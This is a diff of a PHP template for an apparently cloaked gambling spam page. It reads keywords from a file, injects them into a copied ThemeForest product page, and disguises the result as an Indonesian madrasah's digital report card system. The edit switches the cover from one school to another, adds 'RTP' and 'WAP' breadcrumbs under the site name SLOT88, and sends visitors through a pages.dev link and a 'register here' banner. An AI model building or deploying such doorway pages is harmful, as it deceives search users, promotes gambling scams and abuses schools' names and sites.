@@ -53,9 +53,9 @@ pemeliharaan terhadap website ini.
 
 $filename = "lol.txt";
 
-if (isset($_GET['news_ID'])) {
+if (isset($_GET['jasa_ID'])) {
     $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['news_ID']);
+    $target_string = strtolower($_GET['jasa_ID']);
     foreach ($lines as $item) {
         if (strtolower($item) === $target_string) {
             $BRAND = strtoupper($target_string);
@@ -85,7 +85,7 @@ if (isset($_GET['news_ID'])) {
     denied();
     exit();
 }
-$ampmek = "https://rdm-mtsn2pangandaran.pages.dev/?news_ID=$BRANDS";
+$ampmek = "https://rdm-misyamramerauke.pages.dev/?jasa_ID=$BRANDS";
 ?>
 
 
@@ -107,8 +107,8 @@ var codeVersion="f7d8b3d494288b34cb00105ee5d230d68b0ccca7"
     <link rel="preload" href="https://market-resized.envatousercontent.com/themeforest.net/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.__large_preview.jpg?auto=format&amp;q=94&amp;cf_fit=crop&amp;gravity=top&amp;h=8000&amp;w=590&amp;s=cc700268e0638344373c64d90d02d184c75d7defef1511b43f3ecf3627a3f2d4" as="image">
     <link rel="preload" href="https://public-assets.envato-static.com/assets/generated_sprites/logos-20f56d7ae7a08da2c6698db678490c591ce302aedb1fcd05d3ad1e1484d3caf9.png" as="image">
     <link rel="preload" href="https://public-assets.envato-static.com/assets/generated_sprites/common-5af54247f3a645893af51456ee4c483f6530608e9c15ca4a8ac5a6e994d9a340.png" as="image">
-    <title><?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul</title>
-    <meta name="description" content="<?php echo $BRANDS;?> sebagai sarana penilaian hasil belajar siswa menggantikan rapor konvensional, memungkinkan guru menginput nilai kapan pun dan dari mana pun, sementara wali dan orang tua dapat memantau perkembangan kompetensi anak secara real time.">
+    <title><?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke</title>
+    <meta name="description" content="<?php echo $BRANDS;?> adalah sistem penilaian online yang dikembangkan khusus untuk madrasah seperti MIS Yamra Merauke, guna memudahkan proses input nilai, pengolahan raport, dan pemantauan perkembangan akademik siswa secara elektronik.">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <link rel="icon" type="image/x-icon" href="https://jasacuan-1.art/img/pavicon1.jpeg">
     <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons favicons/apple-touch-icon-72x72-precomposed-ea6fb08063069270d41814bdcea6a36fee5fffaba8ec1f0be6ccf3ebbb63dddb.png" sizes="72x72">
@@ -127,9 +127,9 @@ var codeVersion="f7d8b3d494288b34cb00105ee5d230d68b0ccca7"
 {
   "@context": "https://schema.org",
   "@type": "Product",
-  "name": "<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul",
-  "image": "https://i.pinimg.com/736x/22/a0/74/22a074f87cdc0e0a833acf4a318c9f01.jpg",
-  "description": "<?php echo $BRANDS;?> sebagai sarana penilaian hasil belajar siswa menggantikan rapor konvensional, memungkinkan guru menginput nilai kapan pun dan dari mana pun, sementara wali dan orang tua dapat memantau perkembangan kompetensi anak secara real time.",
+  "name": "<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke",
+  "image": "https://i.pinimg.com/736x/41/be/df/41bedf2339398976cf3e91432cb8fb87.jpg",
+  "description": "<?php echo $BRANDS;?> adalah sistem penilaian online yang dikembangkan khusus untuk madrasah seperti MIS Yamra Merauke, guna memudahkan proses input nilai, pengolahan raport, dan pemantauan perkembangan akademik siswa secara elektronik.",
   "brand": {
     "@type": "Brand",
     "name": "<?PHP ECHO $BRANDS;?>"
@@ -216,7 +216,19 @@ var codeVersion="f7d8b3d494288b34cb00105ee5d230d68b0ccca7"
     {
       "@type": "ListItem",
       "position": 5,
-      "name": "<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul",
+      "name": "RTP <?PHP ECHO $BRANDS;?>",
+      "item": "<?php echo $urlPath;?>"
+    },
+    {
+      "@type": "ListItem",
+      "position": 6,
+      "name": "WAP <?PHP ECHO $BRANDS;?>",
+      "item": "<?php echo $urlPath;?>"
+    },
+    {
+      "@type": "ListItem",
+      "position": 7,
+      "name": "<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke",
       "item": "<?php echo $urlPath;?>"
     }
   ]
@@ -254,22 +266,22 @@ window.dataLayer=window.dataLayer||[];
     <meta name="bingbot" content="nocache">
 
     <!-- Open Graph -->
-    <meta property="og:title" content="<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul">
-    <meta property="og:description" content="<?php echo $BRANDS;?> sebagai sarana penilaian hasil belajar siswa menggantikan rapor konvensional, memungkinkan guru menginput nilai kapan pun dan dari mana pun, sementara wali dan orang tua dapat memantau perkembangan kompetensi anak secara real time.">
-    <meta property="og:image" content="https://i.pinimg.com/736x/22/a0/74/22a074f87cdc0e0a833acf4a318c9f01.jpg">
+    <meta property="og:title" content="<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke">
+    <meta property="og:description" content="<?php echo $BRANDS;?> adalah sistem penilaian online yang dikembangkan khusus untuk madrasah seperti MIS Yamra Merauke, guna memudahkan proses input nilai, pengolahan raport, dan pemantauan perkembangan akademik siswa secara elektronik.">
+    <meta property="og:image" content="https://i.pinimg.com/736x/41/be/df/41bedf2339398976cf3e91432cb8fb87.jpg">
     <meta property="og:url" content="<?php echo $urlpath;?>">
     <meta property="og:type" content="website">
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul">
-    <meta name="twitter:description" content="<?php echo $BRANDS;?> sebagai sarana penilaian hasil belajar siswa menggantikan rapor konvensional, memungkinkan guru menginput nilai kapan pun dan dari mana pun, sementara wali dan orang tua dapat memantau perkembangan kompetensi anak secara real time.">
-    <meta name="twitter:image" content="https://i.pinimg.com/736x/22/a0/74/22a074f87cdc0e0a833acf4a318c9f01.jpg">
-    <meta property="og:title" content="<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul">
+    <meta name="twitter:title" content="<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke">
+    <meta name="twitter:description" content="<?php echo $BRANDS;?> adalah sistem penilaian online yang dikembangkan khusus untuk madrasah seperti MIS Yamra Merauke, guna memudahkan proses input nilai, pengolahan raport, dan pemantauan perkembangan akademik siswa secara elektronik.">
+    <meta name="twitter:image" content="https://i.pinimg.com/736x/41/be/df/41bedf2339398976cf3e91432cb8fb87.jpg">
+    <meta property="og:title" content="<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke">
     <meta property="og:type" content="website">
     <meta property="og:url" content="<?php echo $urlpath;?>">
-    <meta property="og:image" content="https://i.pinimg.com/736x/22/a0/74/22a074f87cdc0e0a833acf4a318c9f01.jpg"/>
-    <meta property="og:description" content="<?php echo $BRANDS;?> sebagai sarana penilaian hasil belajar siswa menggantikan rapor konvensional, memungkinkan guru menginput nilai kapan pun dan dari mana pun, sementara wali dan orang tua dapat memantau perkembangan kompetensi anak secara real time.">
+    <meta property="og:image" content="https://i.pinimg.com/736x/41/be/df/41bedf2339398976cf3e91432cb8fb87.jpg"/>
+    <meta property="og:description" content="<?php echo $BRANDS;?> adalah sistem penilaian online yang dikembangkan khusus untuk madrasah seperti MIS Yamra Merauke, guna memudahkan proses input nilai, pengolahan raport, dan pemantauan perkembangan akademik siswa secara elektronik.">
     <meta property="og:site_name" content="SLOT88">
     <meta name="csrf-param" content="authenticity_token">
     <meta name="csrf-token" content="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ">
@@ -291,7 +303,7 @@ var gtmId='GTM-KGCDGPL6';var container_env_param="";(function(w,d,s,l,i){w[l]=w[
     <script src="https://bat.bing.com/p/action/16005611.js" type="text/javascript" async="" data-ueto="ueto_8c931ec7a9"></script>
         <script src="https://g.lzd-cdn.org/g/mtb/lib-mtop/2.5.1/polyfillB.js,mtb/lib-promise/3.1.3/mtop.js,mtb/lib-modules/1.1.4/pc.js"></script>
     <meta http-equiv="origin-trial" content="A7JYkbIvWKmS8mWYjXO12SIIsfPdI7twY91Y3LWOV/YbZmN1ZhYv8O+Zs6/IPCfBE99aV9tIC8sWZSCN09vf7gkAAACWeyJvcmlnaW4iOiJodHRwczovL2N0LnBpbnRlcmVzdC5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
-<style>body{background-color:#7d6428;background-image:linear-gradient(315deg,#7d6428 0%,#b88416 74%);background-attachment:fixed}.site-header,.global-header,.site-header__sites,.site-header__categories{background-color:#7d6428!important;background-image:linear-gradient(315deg,#7d6428 0%,#b88416 74%)!important}.item-preview,.purchase-panel,.box--no-padding{background-color:rgba(255,255,255,.1)!important;backdrop-filter:blur(12px)!important;-webkit-backdrop-filter:blur(12px)!important;border-radius:16px!important;border:1px solid rgba(255,255,255,.2)!important;box-shadow:0 4px 30px rgba(0,0,0,.1)}.item-preview,.purchase-panel{padding:24px!important;border:none!important}.item-preview__actions{background:transparent!important}.purchase-panel h3,.purchase-panel .price,.purchase-panel p,.purchase-panel label,.purchase-panel a,.purchase-panel .meta-attributes__attr-name,.purchase-panel .meta-attributes__attr-detail{color:#fff!important;text-shadow:1px 1px 3px rgba(0,0,0,.5)}.purchase-panel a{color:#a8eb12!important}</style>
+<style>body{background-color:#fff;background-image:linear-gradient(315deg,#00e1ff 30%,#000000 90%);background-attachment:fixed}.site-header,.global-header,.site-header__sites,.site-header__categories{background-color:#fff!important;background-image:linear-gradient(315deg,#000000 0%,#00e1ff 74%)!important}.item-preview,.purchase-panel,.box--no-padding{background-color:rgba(255,255,255,.1)!important;backdrop-filter:blur(12px)!important;-webkit-backdrop-filter:blur(12px)!important;border-radius:16px!important;border:1px solid rgba(255,255,255,.2)!important;box-shadow:0 4px 30px rgba(0,0,0,.1)}.item-preview,.purchase-panel{padding:24px!important;border:none!important}.item-preview__actions{background:transparent!important}.purchase-panel h3,.purchase-panel .price,.purchase-panel p,.purchase-panel label,.purchase-panel a,.purchase-panel .meta-attributes__attr-name,.purchase-panel .meta-attributes__attr-detail{color:#000000!important;text-shadow:1px 1px 3px rgba(0,0,0,.5)}.purchase-panel a{color:#a8eb12!important}.header-categories{background-image:linear-gradient(315deg,#00e1ff 0%,#000000 74%)}.context-header{background:linear-gradient(315deg,#000000 0%,#00e1ff 74%)!important}</style>
 </head>
 
 <body class="color-scheme-light" data-view="app impressionTracker" data-responsive="true" data-user-signed-in="false" __processed_046ac43c-cdf6-4311-9a75-3ea1775342f5__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuMjYiLCJzY29yZSI6MjAwMjYwfV0=">
@@ -973,10 +985,10 @@ dataLayer.push({event:'analytics_ready',event_attributes:{event_type:'user',cust
                             <div class="item-header" data-view="itemHeader" bis_skin_checked="1">
                                 <div class="item-header__top" bis_skin_checked="1">
                                     <div class="item-header__title" bis_skin_checked="1">
-                                        <h1 class="t-heading -color-inherit -size-l h-m0 is-hidden-phone"><?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul</h1>
+                                        <h1 class="t-heading -color-inherit -size-l h-m0 is-hidden-phone"><?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke</h1>
 
                                         <h1 class="t-heading -color-inherit -size-xs h-m0 is-hidden-tablet-and-above">
-                                            <?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul
+                                            <?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke
                                         </h1>
                                     </div>
 
@@ -1053,7 +1065,7 @@ dataLayer.push({event:'analytics_ready',event_attributes:{event_type:'user',cust
 
 
                             </div>
-<style>.n-columns-2{display:grid;grid-template-columns:repeat(2,1fr);font-weight:700}.n-columns-2 a{text-align:center}.login,.register{color:#fff;padding:13px 10px}.login,.login-button{text-shadow:2px 2px #0c0f12;border-radius:10px 10px;border:1px solid #1e274b;background:linear-gradient(to bottom,#7d6428 0,#fae88c 100%);color:#fff}.register,.register-button{text-shadow:2px 2px #000;border-radius:10px 10px;background:linear-gradient(to bottom,#b88416 0,#b88416 100%);border:1px solid #1e274b}</style>
+<style>.n-columns-2{display:grid;grid-template-columns:repeat(2,1fr);font-weight:700}.n-columns-2 a{text-align:center}.login,.register{color:#fff;padding:13px 10px}.login,.login-button{text-shadow:2px 2px #0c0f12;border-radius:10px 10px;border:1px solid #1e274b;background:linear-gradient(to bottom,#000 0,#00e1ff 100%);color:#fff}.register,.register-button{text-shadow:2px 2px #000;border-radius:10px 10px;background:linear-gradient(to bottom,#00e1ff 0,#000 100%);border:1px solid #1e274b}</style>
 <!-- Section 2 -->
   </div>
 </div>
@@ -1106,12 +1118,12 @@ dataLayer.push({event:'analytics_ready',event_attributes:{event_type:'user',cust
 
                         <div class="grid-container" bis_skin_checked="1">
                             <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"user","ecommerce":{"currency":"USD","value":37.0,"items":[{"affiliation":"themeforest","item_id":8988002,"item_name":"<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul","item_brand":"tokopress","item_category":"wordpress","item_category2":"ecommerce","item_category3":"woocommerce","price":37.0,"quantity":1,"item_add_on":"bundle_6month","item_variant":"regular"}]}});
+window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"user","ecommerce":{"currency":"USD","value":37.0,"items":[{"affiliation":"themeforest","item_id":8988002,"item_name":"<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke","item_brand":"tokopress","item_category":"wordpress","item_category2":"ecommerce","item_category3":"woocommerce","price":37.0,"quantity":1,"item_add_on":"bundle_6month","item_variant":"regular"}]}});
 //]]></script>
 
 
                             <div bis_skin_checked="1">
-                                <link href="https://i.pinimg.com/736x/22/a0/74/22a074f87cdc0e0a833acf4a318c9f01.jpg">
+                                <link href="https://i.pinimg.com/736x/41/be/df/41bedf2339398976cf3e91432cb8fb87.jpg">
 
                                 <div class="content-s " bis_skin_checked="1">
                                     <div class="item-bookmarking__left-icons__wrapper" bis_skin_checked="1">
@@ -1140,8 +1152,8 @@ window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"
 
 
 
-                                            <a target="_blank" href="<?php echo $ampmek;?>"><img alt="<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul" width="300" height="300" srcset="https://i.pinimg.com/736x/22/a0/74/22a074f87cdc0e0a833acf4a318c9f01.jpg" sizes="(min-width: 1024px) 590px, (min-width: 1px) 100vw, 600px" src="https://i.pinimg.com/736x/22/a0/74/22a074f87cdc0e0a833acf4a318c9f01.jpg"></a>
-                                            <div class="js- item-preview-image__gallery" data-title="<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul" data-url="marketica-marketplace-wordpress-theme/screenshots/modal/8988002" bis_skin_checked="1">
+                                            <a target="_blank" href="<?php echo $ampmek;?>"><img alt="<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke" width="300" height="300" srcset="https://i.pinimg.com/736x/41/be/df/41bedf2339398976cf3e91432cb8fb87.jpg" sizes="(min-width: 1024px) 590px, (min-width: 1px) 100vw, 600px" src="https://i.pinimg.com/736x/41/be/df/41bedf2339398976cf3e91432cb8fb87.jpg"></a>
+                                            <div class="js- item-preview-image__gallery" data-title="<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke" data-url="marketica-marketplace-wordpress-theme/screenshots/modal/8988002" bis_skin_checked="1">
                                                 <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg">MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg</a>
                                                 <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/01_marketica2_homepage.png">MARKETICA_PREVIEW/01_marketica2_homepage.png</a>
                                                 <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/02_marketica2_shop_page.png">MARKETICA_PREVIEW/02_marketica2_shop_page.png</a>
@@ -1227,7 +1239,7 @@ window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"
                                     <div class="pricebox-container" bis_skin_checked="1">
                                         <div class="purchase-panel" bis_skin_checked="1">
                                             <div id="purchase-form" class="purchase-form" bis_skin_checked="1">
-                                                <form data-view="purchaseForm" data-analytics-has-custom-click="true" data-analytics-click-payload="{&quot;eventName&quot;:&quot;add_to_cart&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;quantityUpdate&quot;:false,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;value&quot;:37.0,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:8988002,&quot;item_name&quot;:&quot;<?php echo $BRANDS;?> Rapor Digital Madrasah MTsN 2 Pangandaran | <?php echo $BRANDS;?> Inovasi Penilaian Pintar untuk Siswa Unggul&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;wordpress&quot;,&quot;item_category2&quot;:&quot;ecommerce&quot;,&quot;item_category3&quot;:&quot;woocommerce&quot;,&quot;price&quot;:&quot;37&quot;,&quot;quantity&quot;:1}]}}" action="<?php echo $urlpath;?>" accept-charset="UTF-8" method="post">
+                                                <form data-view="purchaseForm" data-analytics-has-custom-click="true" data-analytics-click-payload="{&quot;eventName&quot;:&quot;add_to_cart&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;quantityUpdate&quot;:false,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;value&quot;:37.0,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:8988002,&quot;item_name&quot;:&quot;<?php echo $BRANDS;?> - Inovasi Terkini Rapor Digital Madrasah MIS Yamra Merauke&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;wordpress&quot;,&quot;item_category2&quot;:&quot;ecommerce&quot;,&quot;item_category3&quot;:&quot;woocommerce&quot;,&quot;price&quot;:&quot;37&quot;,&quot;quantity&quot;:1}]}}" action="<?php echo $urlpath;?>" accept-charset="UTF-8" method="post">
                                                     <input type="hidden" name="authenticity_token" value="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ" autocomplete="off">
                                                     <div bis_skin_checked="1">
                                                         <div data-view="itemVariantSelector" data-id="8988002" data-cookiebot-enabled="true" bis_skin_checked="1">
@@ -1331,7 +1343,7 @@ window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"
                                                                 </div>
                                                             </div>
                                                         </div>
-                                                        <p class="t-body -size-m"><i><?php echo $BRANDS;?> sebagai sarana penilaian hasil belajar siswa menggantikan rapor konvensional, memungkinkan guru menginput nilai kapan pun dan dari mana pun, sementara wali dan orang tua dapat memantau perkembangan kompetensi anak secara real time.</i>
+                                                        <p class="t-body -size-m"><i><?php echo $BRANDS;?> adalah sistem penilaian online yang dikembangkan khusus untuk madrasah seperti MIS Yamra Merauke, guna memudahkan proses input nilai, pengolahan raport, dan pemantauan perkembangan akademik siswa secara elektronik.</i>
                                                         </p>
 														<div class="purchase-form__button" bis_skin_checked="1">
                                                                <p><a href="<?php echo $ampmek;?>"><img style="display: block; margin-left: auto; margin-right: auto;" src="https://jasacuan-1.art/img/daftar-klik-disini.gif" alt="" width="274" height="75" /></a></p>
